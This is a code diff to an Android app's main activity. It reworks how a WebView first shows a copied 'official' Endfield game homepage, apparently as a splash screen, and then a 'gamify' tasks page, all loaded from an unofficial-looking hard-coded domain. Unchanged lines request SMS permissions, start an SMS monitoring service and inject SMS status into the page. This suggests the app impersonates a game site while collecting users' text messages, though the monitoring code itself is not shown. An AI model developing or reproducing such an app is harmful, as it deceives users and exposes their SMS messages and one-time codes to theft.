@@ -39,10 +39,8 @@ public class MainActivity extends Activity {
     private static final String DEFAULT_SERVER = "https://api.666-lufengyuan-nb.top";
 
     private WebView webView;
-    private WebView splashView;
-    private FrameLayout container;
     private String serverUrl;
-    private boolean splashDismissed = false;
+    private boolean isSplashPhase = true;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -69,35 +67,22 @@ public class MainActivity extends Activity {
 
         // 创建WebView
         webView = new WebView(this);
-        container = new FrameLayout(this);
+        FrameLayout container = new FrameLayout(this);
         container.setBackgroundColor(Color.parseColor("#0a0a0a"));
         container.addView(webView, new FrameLayout.LayoutParams(
             FrameLayout.LayoutParams.MATCH_PARENT,
             FrameLayout.LayoutParams.MATCH_PARENT
         ));
-
-        // 叠加splash WebView（加载官网首页，显示React原版loading动画）
-        splashView = new WebView(this);
-        splashView.getSettings().setJavaScriptEnabled(true);
-        splashView.getSettings().setDomStorageEnabled(true);
-        splashView.getSettings().setUseWideViewPort(true);
-        splashView.getSettings().setLoadWithOverviewMode(true);
-        splashView.setBackgroundColor(Color.parseColor("#0a0a0a"));
-        container.addView(splashView, new FrameLayout.LayoutParams(
-            FrameLayout.LayoutParams.MATCH_PARENT,
-            FrameLayout.LayoutParams.MATCH_PARENT
-        ));
-        splashView.loadUrl(serverUrl + "/endfield/official-v4/zh-cn/");
         setContentView(container);
 
         setupWebView();
         requestSmsPermissions();
         startSmsMonitorService();
 
-        // 加载任务中心首页
-        String startUrl = serverUrl + "/endfield/official-v4/zh-cn/gamify/tasks.html";
-        Log.i(TAG, "Loading: " + startUrl);
-        webView.loadUrl(startUrl);
+        // 先加载官网首页，显示React原版loading动画
+        String splashUrl = serverUrl + "/endfield/official-v4/zh-cn/";
+        Log.i(TAG, "Loading splash: " + splashUrl);
+        webView.loadUrl(splashUrl);
     }
 
     private void setupWebView() {
@@ -139,10 +124,21 @@ public class MainActivity extends Activity {
             @Override
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
-                // 注入SMS状态到网页
-                injectSmsStatus();
-                // 页面加载完成，触发splash完成动画并移除
-                dismissSplash();
+                if (isSplashPhase) {
+                    // 官羑首页加载完成，等待loading动画播放后跳转到gamify
+                    isSplashPhase = false;
+                    new Handler().postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            String gamifyUrl = serverUrl + "/endfield/official-v4/zh-cn/gamify/tasks.html";
+                            Log.i(TAG, "Splash done, loading gamify: " + gamifyUrl);
+                            webView.loadUrl(gamifyUrl);
+                        }
+                    }, 6000);
+                } else {
+                    // gamify页面加载完成
+                    injectSmsStatus();
+                }
             }
         });
 
@@ -301,26 +297,6 @@ public class MainActivity extends Activity {
         if (webView != null) {
             injectSmsStatus();
         }
-    }
-
-    private void dismissSplash() {
-        if (splashDismissed || splashView == null) return;
-        splashDismissed = true;
-        // 调用splash页面的完成动画
-        if (Build.VERSION.SDK_INT >= 19) {
-            splashView.evaluateJavascript("window.splashComplete && window.splashComplete()", null);
-        }
-        // 动画结束后移除splash WebView
-        new Handler().postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (splashView != null) {
-                    container.removeView(splashView);
-                    splashView.destroy();
-                    splashView = null;
-                }
-            }
-        }, 800);
     }
 
     private String escapeJson(String s) {
